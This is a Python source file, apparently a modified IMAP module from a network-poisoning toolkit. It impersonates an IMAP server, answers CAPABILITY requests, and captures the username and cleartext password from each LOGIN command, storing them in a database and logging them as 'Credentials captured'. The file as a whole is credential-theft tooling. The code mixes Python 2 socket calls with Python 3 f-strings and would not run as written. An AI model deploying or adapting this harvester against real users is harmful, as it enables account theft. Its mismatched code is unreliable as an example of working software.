from utils import *
from SocketServer import BaseRequestHandler
from packets import IMAPGreeting, IMAPCapability, IMAPCapabilityEnd

# This variable will collect all the output for HTML rendering
output_data = []

class IMAP(BaseRequestHandler):
    def handle(self):
        global output_data
        output_data = []  # Clear previous data

        try:
            # Send the initial IMAP greeting
            self.request.send(str(IMAPGreeting()))
            output_data.append(f'[IMAP] Greeting sent to {self.client_address[0]}')
            data = self.request.recv(1024)

            # Handle CAPABILITY requests
            if data[5:15] == "CAPABILITY":
                RequestTag = data[0:4]
                self.request.send(str(IMAPCapability()))
                self.request.send(str(IMAPCapabilityEnd(Tag=RequestTag)))
                output_data.append(f'[IMAP] Capability request handled for {self.client_address[0]}')
                data = self.request.recv(1024)

            # Handle LOGIN requests
            if data[5:10] == "LOGIN":
                Credentials = data[10:].strip().split()

                SaveToDb({
                    'module': 'IMAP',
                    'type': 'Cleartext',
                    'client': self.client_address[0],
                    'user': Credentials[0],
                    'cleartext': Credentials[1],
                    'fullhash': f'{Credentials[0]}:{Credentials[1]}',
                })
                
                output_data.append(f'[IMAP] Credentials captured: {Credentials[0]}:{Credentials[1]}')

                # fixme: Close connection properly if needed
                # self.request.send(str(ditchthisconnection()))
                # data = self.request.recv(1024)

        except Exception as e:
            output_data.append(f'[IMAP] Error handling request: {e}')
            pass

        return output_data  # Return the collected output